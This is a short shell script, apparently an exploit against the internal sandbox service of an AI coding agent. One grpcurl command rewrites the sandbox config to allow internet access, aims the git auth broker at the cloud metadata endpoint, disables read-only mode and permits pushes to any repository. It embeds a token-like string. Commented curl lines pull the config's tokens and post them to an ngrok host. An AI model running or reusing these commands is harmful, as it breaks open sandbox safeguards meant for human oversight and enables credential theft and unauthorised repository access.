go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
echo '{"config":{"networkIsolation":{"policy":"POLICY_ALLOW_INTERNET"},"gitAuthBrokerConfig":"auth_basic_user:x-access-token\nauth_basic_pass: ghs_AbCCkb7gJJDwIZNjFvyMVmTscUqrcB1BxNnG\ntarget_service_url:http://169.254.169.254\nreadonly_mode: false\nallowed_push_branches_regex: .*\nallowed_push_repo_regex: .*\n"}}' | grpcurl -plaintext -d @ 192.168.0.1:8000 google.jules.runtime.sandbox.JulesSandboxService/ApplyConfig

#TOKENS=`printf '\x00\x00\x00\x00\x00' | curl -s --http2-prior-knowledge -X POST -H 'Content-Type: application/grpc' -H 'TE: trailers' --data-binary @- http://192.168.0.1:8000/google.jules.runtime.sandbox.JulesSandboxService/GetConfig`
#curl -d "$TOKENS" https://revisable-bulginess-silica.ngrok-free.dev
